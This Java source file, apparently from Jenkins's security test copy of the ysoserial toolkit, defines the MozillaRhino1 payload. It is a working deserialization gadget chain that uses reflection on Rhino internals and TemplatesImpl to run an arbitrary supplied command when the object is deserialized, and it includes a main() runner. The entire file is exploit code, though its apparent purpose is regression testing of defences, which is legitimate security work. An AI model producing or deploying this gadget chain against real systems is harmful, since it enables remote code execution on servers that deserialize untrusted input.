package jenkins.security.security218.ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.mozilla.javascript.*;
import jenkins.security.security218.ysoserial.payloads.annotation.Dependencies;
import jenkins.security.security218.ysoserial.payloads.util.Gadgets;
import jenkins.security.security218.ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/*
    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"rhino:js:1.7R2"})
public class MozillaRhino1 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {

        Class nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        nativeErrorConstructor.setAccessible(true);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        Context context = Context.enter();

        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();

        Method enterMethod = Context.class.getDeclaredMethod("enter");
        NativeJavaMethod method = new NativeJavaMethod(enterMethod, "name");
        idScriptableObject.setGetterOrSetter("name", 0, method, false);

        Method newTransformer = TemplatesImpl.class.getDeclaredMethod("newTransformer");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
        idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);

        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
        getSlot.setAccessible(true);
        Object slot = getSlot.invoke(idScriptableObject, "name", 0, 1);
        Field getter = slot.getClass().getDeclaredField("getter");
        getter.setAccessible(true);

        Class memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
        Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
        memberboxClassConstructor.setAccessible(true);
        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
        getter.set(slot, memberboxes);

        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(command), TemplatesImpl.class);
        idScriptableObject.setPrototype(nativeObject);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, idScriptableObject);

        return badAttributeValueExpException;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino1.class, args);
    }
}